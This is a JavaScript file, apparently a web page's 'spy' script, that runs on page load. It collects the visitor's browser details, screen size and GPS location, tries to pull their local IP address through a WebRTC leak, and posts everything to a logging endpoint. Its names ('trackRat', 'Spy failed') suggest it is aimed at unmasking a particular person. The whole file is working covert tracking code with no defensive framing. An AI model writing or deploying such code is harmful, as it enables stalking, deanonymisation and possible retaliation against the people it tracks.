// public/spy.js - Clean Single-Log Version

async function getLocalIP() {
    return new Promise((resolve) => {
        const connection = new RTCPeerConnection({ iceServers: [] });
        connection.createDataChannel("");
        
        connection.createOffer().then(offer => connection.setLocalDescription(offer));
        
        let resolved = false;
        const handler = (event) => {
            if (resolved) return;
            
            if (!event.candidate) {
                connection.close();
                resolved = true;
                resolve(null); // No local IP found
            } else if (/candidate.*127/.test(event.candidate.candidate)) {
                const ipMatch = event.candidate.candidate.match(/([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/);
                if (ipMatch) {
                    connection.close();
                    resolved = true;
                    resolve(ipMatch[0]);
                }
            }
        };
        
        connection.onicecandidate = handler;
        
        // Timeout after 2 seconds if IP isn't found
        setTimeout(() => {
            if (!resolved) {
                connection.close();
                resolved = true;
                resolve(null);
            }
        }, 2000);
    });
}

async function trackRat() {
    const data = {
        user_agent: navigator.userAgent,
        screen_res: `${screen.width}x${screen.height}`,
        timestamp: Date.now()
    };

    let lat = null;
    let lon = null;

    // 1. Get GPS (Promise wrapper)
    const gpsPromise = new Promise((resolve) => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
                () => resolve({ lat: null, lon: null }) // Denied or error
            );
        } else {
            resolve({ lat: null, lon: null });
        }
    });

    // 2. Get Local IP
    const ipPromise = getLocalIP();

    // 3. Wait for both (or timeouts)
    try {
        const [gpsResult, localIP] = await Promise.allSettled([gpsPromise, ipPromise]);
        
        if (gpsResult.status === 'fulfilled' && gpsResult.value.lat) {
            data.lat = gpsResult.value.lat;
            data.lon = gpsResult.value.lon;
        }
        
        if (localIP.status === 'fulfilled' && localIP.value) {
            data.local_ip = localIP.value;
        }

        sendData(data);
    } catch (e) {
        console.error("Spy failed", e);
    }
}

async function sendData(payload) {
    try {
        await fetch('/api/log', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    } catch (e) {
        console.error("Send failed", e);
    }
}

trackRat();